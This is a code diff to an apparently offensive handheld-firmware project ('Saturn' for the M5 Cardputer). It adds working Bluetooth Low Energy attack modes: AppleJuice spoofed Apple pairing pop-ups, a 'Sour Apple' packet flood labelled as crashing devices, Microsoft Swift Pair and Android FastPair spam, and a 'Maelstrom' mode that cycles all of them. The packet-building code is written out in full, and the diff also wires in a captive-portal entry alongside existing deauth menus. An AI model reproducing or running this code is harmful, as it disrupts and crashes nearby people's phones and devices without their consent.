@@ -9,6 +9,8 @@
 #include <IRsend.h>
 #include <DNSServer.h>
 #include <WebServer.h>
+#include <BLEUtils.h>
+#include <BLEServer.h>
 
 #include "src/settings.h"
 #include "src/language.h"
@@ -17,6 +19,7 @@
 #include "src/deauth.h"
 #include "src/sd.h"
 #include "src/portal.h"
+#include "src/applejuice.h"
 
 IRsend irsend(IR_SEND_PIN);
 
@@ -34,7 +37,8 @@ struct QrCode {
 
 Menu mainMenu[] = {
   {TXT_IR, 4},
-  {"Wi-Fi", 20},
+  {"WiFi", 20},
+  {"Bluetooth", 27},
   {"QR Codes", 2},
   {TXT_SETTINGS, 3},
 };
@@ -68,6 +72,7 @@ Menu wifiMenu[] = {
   {TXT_WIFI_BEACON_FUNNY, 1},
   {TXT_WIFI_BEACON_FUNNY_BR, 2},
   {TXT_BEACON_ATTACK_RND, 3},
+  {"Captive Portal", 5},
   {TXT_BACK, 0},
 };
 int wifiMenuSize = sizeof(wifiMenu) / sizeof(Menu);
@@ -79,6 +84,50 @@ Menu wifiAttackMenu[] = {
   {TXT_BACK, 5},
 };
 int wifiAttackMenuSize = sizeof(wifiAttackMenu) / sizeof(Menu);
+
+Menu bluetoothMenu[] = {
+  {"AppleJuice", 1},
+  {"Swift Pair", 2},
+  {"Android Spam", 3},
+  {TXT_SA_CRASH, 4},
+  {"BT Maelstrom", 5},
+  {TXT_BACK, 0},
+};
+int bluetoothMenuSize = sizeof(bluetoothMenu) / sizeof(Menu);
+
+Menu appleJuiceMenu[] = {
+  {"AirPods", 1},
+  {TXT_AJ_TRANSF_NM, 27},
+  {"AirPods Pro", 2},
+  {"AirPods Max", 3},
+  {"AirPods G2", 4},
+  {"AirPods G3", 5},
+  {"AirPods Pro G2", 6},
+  {"PowerBeats", 7},
+  {"PowerBeats Pro", 8},
+  {"Beats Solo Pro", 9},
+  {"Beats Studio Buds", 10},
+  {"Beats Flex", 11},
+  {"Beats X", 12},
+  {"Beats Solo 3", 13},
+  {"Beats Studio 3", 14},
+  {"Beats Studio Pro", 15},
+  {"Beats Fit Pro", 16},
+  {"Beats Studio Buds+", 17},
+  {"Apple Vision Pro", 29},
+  {"AppleTV Setup", 18},
+  {"AppleTV Pair", 19},
+  {"AppleTV New User", 20},
+  {"AppleTV AppleID", 21},
+  {"AppleTV Audio", 22},
+  {"AppleTV HomeKit", 23},
+  {"AppleTV Keyboard", 24},
+  {"AppleTV Network", 25},
+  {TXT_AJ_TV_COLOR, 26},
+  {TXT_STP_NW_PH, 28},
+  {TXT_BACK, 0},
+};
+int appleJuiceMenuSize = sizeof(appleJuiceMenu) / sizeof(Menu);
 
 QrCode qrMenu[] = {
   {"Saturn", "https://youtu.be/dzNvk80XY9s"},
@@ -386,6 +435,9 @@ void wifiMenuLoop() {
         break;
       case 4:
         currentProc = 22;  // Wi-Fi Scan
+        break;
+      case 5:
+        currentProc = 25;  // Captive Portal
         break;
     }
   }
@@ -918,6 +970,394 @@ void wifiBeaconLoop() {
   }
 }
 
+// -=-=-= BLUETOOTH =-=-=-
+
+void bluetoothMenuSetup() {
+  cursor = 0;
+  sourApple = false;
+  swiftPair = false;
+  maelstrom = false;
+  androidPair = false;
+  rstOverride = true;
+  drawMenu(bluetoothMenu, bluetoothMenuSize);
+  delay(500); // Prevent switching after menu loads up
+}
+
+void bluetoothMenuLoop() {
+  if (checkNextPress()) {
+    cursor++;
+    cursor = cursor % bluetoothMenuSize;
+    drawMenu(bluetoothMenu, bluetoothMenuSize);
+    delay(250);
+  }
+  if (checkSelectPress()) {
+    int option = bluetoothMenu[cursor].command;
+
+    DISPLAY.fillScreen(BG_COLOR);
+    DISPLAY.setTextSize(MEDIUM_TEXT);
+    DISPLAY.setTextColor(BG_COLOR);
+    DISPLAY.fillRoundRect(5, 4, DISPLAY.width() - 10, 30, 10, MAIN_COLOR);
+    DISPLAY.drawRoundRect(5, 4, DISPLAY.width() - 10, 30, 10, MAIN_COLOR);
+    DISPLAY.drawString("Bluetooth Spam", DISPLAY_CENTER_X, 20);
+    DISPLAY.setTextSize(1.5);
+    DISPLAY.setTextColor(MAIN_COLOR);
+    DISPLAY.drawString(TXT_ADV, DISPLAY_CENTER_X, 70);
+
+    switch(option) {
+      case 1:  // AppleJuice
+        DISPLAY.fillScreen(BG_COLOR);
+        rstOverride = false;
+        isSwitching = true;
+        currentProc = 28;
+        break;
+      case 2:  // appleJuiceAdvertising
+        swiftPair = true;
+        currentProc = 29; // jump straight to appleJuice Advertisement
+        rstOverride = false;
+        isSwitching = true;
+        DISPLAY.drawString(TXT_SP_RND, DISPLAY_CENTER_X, 85);
+        DISPLAY.drawString(TXT_SEL_EXIT2, DISPLAY_CENTER_X, 100);
+        break;
+      case 4:  // appleJuiceAdvertising
+        sourApple = true;
+        currentProc = 29; // jump straight to appleJuice Advertisement
+        rstOverride = false;
+        isSwitching = true;
+        DISPLAY.drawString(TXT_SA_CRASH, DISPLAY_CENTER_X, 85);
+        DISPLAY.drawString(TXT_SEL_EXIT2, DISPLAY_CENTER_X, 100);
+        break;
+      case 5:  // BT Maelstrom
+        rstOverride = false;
+        isSwitching = true;
+        currentProc = 30; // Maelstrom
+        DISPLAY.drawString("Bluetooth Maelstrom", DISPLAY_CENTER_X, 85);
+        DISPLAY.drawString(TXT_CMB_BT_SPAM, DISPLAY_CENTER_X, 100);
+        DISPLAY.drawString(TXT_SEL_EXIT2, DISPLAY_CENTER_X, 115);
+        break;
+      case 3:  // Android Spam
+        androidPair = true;
+        currentProc = 29; // jump straight to appleJuice Advertisement
+        rstOverride = false;
+        isSwitching = true;
+        DISPLAY.drawString(TXT_AD_SPAM, DISPLAY_CENTER_X, 85);
+        DISPLAY.drawString(TXT_SEL_EXIT2, DISPLAY_CENTER_X, 100);
+        break;
+      case 0:  // Back
+        DISPLAY.fillScreen(BG_COLOR);
+        rstOverride = false;
+        isSwitching = true;
+        currentProc = 1;
+        break;
+    }
+  }
+}
+
+void appleJuiceSetup(){
+  DISPLAY.fillScreen(BG_COLOR);
+  DISPLAY.setTextSize(3);
+  DISPLAY.setTextColor(MAIN_COLOR);
+  DISPLAY.drawString("AppleJuice", DISPLAY_CENTER_X, 70);
+  DISPLAY.setTextColor(MAIN_COLOR);
+  delay(1000);  
+  cursor = 0;
+  sourApple = false;
+  swiftPair = false;
+  maelstrom = false;
+  rstOverride = true;
+  drawMenu(appleJuiceMenu, appleJuiceMenuSize);
+}
+
+void appleJuiceLoop(){
+  if (!maelstrom){
+    if (checkNextPress()) {
+      cursor++;
+      cursor = cursor % appleJuiceMenuSize;
+      drawMenu(appleJuiceMenu, appleJuiceMenuSize);
+      delay(100);
+    }
+  }
+  if (checkSelectPress() || maelstrom) {
+    deviceType = appleJuiceMenu[cursor].command;
+    if (maelstrom) {
+      deviceType = random(1, 28);
+    }
+    switch(deviceType) {
+      case 1:
+        data = Airpods;
+        break;
+      case 2:
+        data = AirpodsPro;
+        break;
+      case 3:
+        data = AirpodsMax;
+        break;
+      case 4:
+        data = AirpodsGen2;
+        break;
+      case 5:
+        data = AirpodsGen3;
+        break;
+      case 6:
+        data = AirpodsProGen2;
+        break;
+      case 7:
+        data = PowerBeats;
+        break;
+      case 8:
+        data = PowerBeatsPro;
+        break;
+      case 9:
+        data = BeatsSoloPro;
+        break;
+      case 10:
+        data = BeatsStudioBuds;
+        break;
+      case 11:
+        data = BeatsFlex;
+        break;
+      case 12:
+        data = BeatsX;
+        break;
+      case 13:
+        data = BeatsSolo3;
+        break;
+      case 14:
+        data = BeatsStudio3;
+        break;
+      case 15:
+        data = BeatsStudioPro;
+        break;
+      case 16:
+        data = BeatsFitPro;
+        break;
+      case 17:
+        data = BeatsStudioBudsPlus;
+        break;
+      case 18:
+        data = AppleTVSetup;
+        break;
+      case 19:
+        data = AppleTVPair;
+        break;
+      case 20:
+        data = AppleTVNewUser;
+        break;
+      case 21:
+        data = AppleTVAppleIDSetup;
+        break;
+      case 22:
+        data = AppleTVWirelessAudioSync;
+        break;
+      case 23:
+        data = AppleTVHomekitSetup;
+        break;
+      case 24:
+        data = AppleTVKeyboard;
+        break;
+      case 25:
+        data = AppleTVConnectingToNetwork;
+        break;
+      case 26:
+        data = TVColorBalance;
+        break;
+      case 27:
+        data = TransferNumber;
+        break;
+      case 28:
+        data = SetupNewPhone;
+        break;
+      case 29:
+        data = AppleVisionPro;
+        break;
+      case 0:
+        rstOverride = false;
+        isSwitching = true;
+        currentProc = 27;  // Back to Bluetooth Menu
+        break;
+    }
+    if (currentProc == 28 && isSwitching == false){
+      DISPLAY.fillScreen(BG_COLOR);
+      DISPLAY.setTextSize(MEDIUM_TEXT);
+      DISPLAY.setTextColor(BG_COLOR);
+      DISPLAY.fillRoundRect(5, 4, DISPLAY.width() - 10, 30, 10, MAIN_COLOR);
+      DISPLAY.drawRoundRect(5, 4, DISPLAY.width() - 10, 30, 10, MAIN_COLOR);
+      DISPLAY.drawString("AppleJuice", DISPLAY_CENTER_X, 20);
+      DISPLAY.setTextSize(1.5);
+      DISPLAY.setTextColor(MAIN_COLOR);
+      DISPLAY.drawString(String(appleJuiceMenu[cursor].name), DISPLAY_CENTER_X, 70);
+      DISPLAY.drawString(TXT_ADV, DISPLAY_CENTER_X, 85);
+      DISPLAY.drawString(TXT_SEL_EXIT2, DISPLAY_CENTER_X, 100);
+      isSwitching = true;
+      currentProc = 29; // Jump over to the AppleJuice BLE beacon loop
+    }
+  }
+}
+
+void appleJuiceAdvertisingSetup(){
+  rstOverride = false;  
+}
+
+void appleJuiceAdvertisingLoop(){
+  // run the advertising loop
+  // Isolating this to its own process lets us take advantage 
+  // of the background stuff easier (menu button, dimmer, etc)
+  rstOverride = true;
+  if (sourApple || swiftPair || androidPair || maelstrom){
+    delay(20);   // 20msec delay instead of ajDelay for SourApple attack
+    advtime = 0; // bypass ajDelay counter
+  }
+  if (millis() > advtime + ajDelay){
+    advtime = millis();
+    pAdvertising->stop(); // This is placed here mostly for timing.
+                          // It allows the BLE beacon to run through the loop.
+    BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();
+    if (sourApple){
+      Serial.print(TXT_SA_ADV);
+      // Some code borrowed from RapierXbox/ESP32-Sour-Apple
+      // Original credits for algorithm ECTO-1A & WillyJL
+      uint8_t packet[17];
+      uint8_t size = 17;
+      uint8_t i = 0;
+      packet[i++] = size - 1;    // Packet Length
+      packet[i++] = 0xFF;        // Packet Type (Manufacturer Specific)
+      packet[i++] = 0x4C;        // Packet Company ID (Apple, Inc.)
+      packet[i++] = 0x00;        // ...
+      packet[i++] = 0x0F;  // Type
+      packet[i++] = 0x05;                        // Length
+      packet[i++] = 0xC1;                        // Action Flags
+      const uint8_t types[] = { 0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0 };
+      packet[i++] = types[rand() % sizeof(types)];  // Action Type
+      esp_fill_random(&packet[i], 3); // Authentication Tag
+      i += 3;
+      packet[i++] = 0x00;  // ???
+      packet[i++] = 0x00;  // ???
+      packet[i++] =  0x10;  // Type ???
+      esp_fill_random(&packet[i], 3);
+      oAdvertisementData.addData(std::string((char *)packet, 17));
+      for (int i = 0; i < sizeof packet; i ++) {
+        Serial.printf("%02x", packet[i]);
+      }
+      Serial.println("");
+    } else if (swiftPair) {
+      const char* display_name = generateRandomName();
+      Serial.printf(TXT_SP_ADV, display_name);
+      uint8_t display_name_len = strlen(display_name);
+      uint8_t size = 7 + display_name_len;
+      uint8_t* packet = (uint8_t*)malloc(size);
+      uint8_t i = 0;
+      packet[i++] = size - 1; // Size
+      packet[i++] = 0xFF; // AD Type (Manufacturer Specific)
+      packet[i++] = 0x06; // Company ID (Microsoft)
+      packet[i++] = 0x00; // ...
+      packet[i++] = 0x03; // Microsoft Beacon ID
+      packet[i++] = 0x00; // Microsoft Beacon Sub Scenario
+      packet[i++] = 0x80; // Reserved RSSI Byte
+      for (int j = 0; j < display_name_len; j++) {
+        packet[i + j] = display_name[j];
+      }
+      for (int i = 0; i < size; i ++) {
+        Serial.printf("%02x", packet[i]);
+      }
+      Serial.println("");
+
+      i += display_name_len;  
+      oAdvertisementData.addData(std::string((char *)packet, size));
+      free(packet);
+      free((void*)display_name);
+    } else if (androidPair) {
+      Serial.print(TXT_AD_SPAM_ADV);
+      uint8_t packet[14];
+      uint8_t i = 0;
+      packet[i++] = 3;  // Packet Length
+      packet[i++] = 0x03; // AD Type (Service UUID List)
+      packet[i++] = 0x2C; // Service UUID (Google LLC, FastPair)
+      packet[i++] = 0xFE; // ...
+      packet[i++] = 6; // Size
+      packet[i++] = 0x16; // AD Type (Service Data)
+      packet[i++] = 0x2C; // Service UUID (Google LLC, FastPair)
+      packet[i++] = 0xFE; // ...
+      const uint32_t model = android_models[rand() % android_models_count].value; // Action Type
+      packet[i++] = (model >> 0x10) & 0xFF;
+      packet[i++] = (model >> 0x08) & 0xFF;
+      packet[i++] = (model >> 0x00) & 0xFF;
+      packet[i++] = 2; // Size
+      packet[i++] = 0x0A; // AD Type (Tx Power Level)
+      packet[i++] = (rand() % 120) - 100; // -100 to +20 dBm
+
+      oAdvertisementData.addData(std::string((char *)packet, 14));
+      for (int i = 0; i < sizeof packet; i ++) {
+        Serial.printf("%02x", packet[i]);
+      }
+      Serial.println("");
+    } else {
+      Serial.print(TXT_AJ_ADV);
+      if (deviceType >= 18){
+        oAdvertisementData.addData(std::string((char*)data, sizeof(AppleTVPair)));
+      } else {
+        oAdvertisementData.addData(std::string((char*)data, sizeof(Airpods)));
+      }
+      for (int i = 0; i < sizeof(Airpods); i ++) {
+        Serial.printf("%02x", data[i]);
+      }      
+      Serial.println("");
+    }
+    
+    pAdvertising->setAdvertisementData(oAdvertisementData);
+    pAdvertising->start();
+#if defined(M5LED)
+    digitalWrite(M5LED, M5LED_ON); //LED ON on Stick C Plus
+    delay(10);
+    digitalWrite(M5LED, M5LED_OFF); //LED OFF on Stick C Plus
+#endif
+  }
+  if (checkNextPress()) {
+    if (sourApple || swiftPair || androidPair || maelstrom){
+      isSwitching = true;
+      currentProc = 27;
+      drawMenu(bluetoothMenu, bluetoothMenuSize);
+    } else {
+      isSwitching = true;
+      currentProc = 28;      
+      drawMenu(appleJuiceMenu, appleJuiceMenuSize);
+    }
+    sourApple = false;
+    swiftPair = false;
+    maelstrom = false;
+    pAdvertising->stop(); // Bug that keeps advertising in the background. Oops.
+    delay(250);
+  }
+}
+
+void bluetoothMaelstromSetup(){
+  rstOverride = false;
+  maelstrom = true;
+}
+
+void bluetoothMaelstromLoop(){
+  swiftPair = false;
+  sourApple = true;
+  appleJuiceAdvertisingLoop();
+  if (maelstrom){
+    swiftPair = true;
+    androidPair = false;
+    sourApple = false;
+    appleJuiceAdvertisingLoop();
+  }
+  if (maelstrom){
+    swiftPair = false;
+    androidPair = true;
+    sourApple = false;
+    appleJuiceAdvertisingLoop();
+  }
+  if (maelstrom){
+    swiftPair = false;
+    androidPair = false;
+    sourApple = false;
+    appleJuiceLoop(); // roll a random device ID
+    appleJuiceAdvertisingLoop();
+  }
+}
+
 // -=-=-= QR CODES =-=-=-
 
 void qrMenuSetup() {
@@ -1149,11 +1589,12 @@ void setup() {
   DISPLAY.fillScreen(BG_COLOR);
   DISPLAY.setTextColor(MAIN_COLOR);
   DISPLAY.setTextSize(LARGE_TEXT);
-  DISPLAY.drawString("Saturn", DISPLAY_CENTER_X, 45);
+  DISPLAY.drawString("Saturn", DISPLAY_CENTER_X, 40);
   DISPLAY.setTextSize(MEDIUM_TEXT);
-  DISPLAY.drawString("Cardputer", DISPLAY_CENTER_X, 75);
+  DISPLAY.drawString("Cardputer", DISPLAY_CENTER_X, 70);
   DISPLAY.setTextSize(SMALL_TEXT);
-  DISPLAY.drawString(SATURN_VERSION, DISPLAY_CENTER_X, 95);
+  DISPLAY.drawString("@henriquesebastiao", DISPLAY_CENTER_X, 90);
+  DISPLAY.drawString(SATURN_VERSION, DISPLAY_CENTER_X, 105);
 
   Serial.println("\nSaturn " + String(SATURN_VERSION) + " <-> STARTED");
   Serial.println("Develped by: @henriquesebastiao");
@@ -1179,6 +1620,21 @@ void setup() {
     Serial.println("Silent Mode: YES");
     delay(1400);
   #endif
+
+  getSSID();  // ???
+
+  // Random seed
+  randomSeed(analogRead(0));
+
+  // Create the BLE Server
+  BLEDevice::init("");
+  BLEServer *pServer = BLEDevice::createServer();
+  pAdvertising = pServer->getAdvertising();
+  BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();
+
+  // Captive Portal Init
+  setupSdCard();
+  bootTime = lastActivity = millis();
 }
 
 // Proccesses
@@ -1195,6 +1651,10 @@ void setup() {
 // 24 - Wi-Fi Scan Result
 // 25 - Captive Portal
 // 26 - Deauth
+// 27 - Bluetooth
+// 28 - AppleJuice
+// 29 - AppleJuice Advertising
+// 30 - Bluetooth Maelstrom
 
 void loop() {
   // Background processes
@@ -1203,6 +1663,7 @@ void loop() {
 
   if (isSwitching) {
     isSwitching = false;
+    Serial.println("Switching to process: " + String(currentProc));
     switch (currentProc) {
       case 1:
         mainMenuSetup();
@@ -1242,6 +1703,18 @@ void loop() {
         break;
       case 26:
         deauthSetup();
+        break;
+      case 27:
+        bluetoothMenuSetup();
+        break;
+      case 28:
+        appleJuiceSetup();
+        break;
+      case 29:
+        appleJuiceAdvertisingSetup();
+        break;
+      case 30:
+        bluetoothMaelstromSetup();
         break;
     }
   }
@@ -1285,6 +1758,18 @@ void loop() {
       break;
     case 26:
       deauthLoop();
+      break;
+    case 27:
+      bluetoothMenuLoop();
+      break;
+    case 28:
+      appleJuiceLoop();
+      break;
+    case 29:
+      appleJuiceAdvertisingLoop();
+      break;
+    case 30:
+      bluetoothMaelstromLoop();
       break;
   }
 }
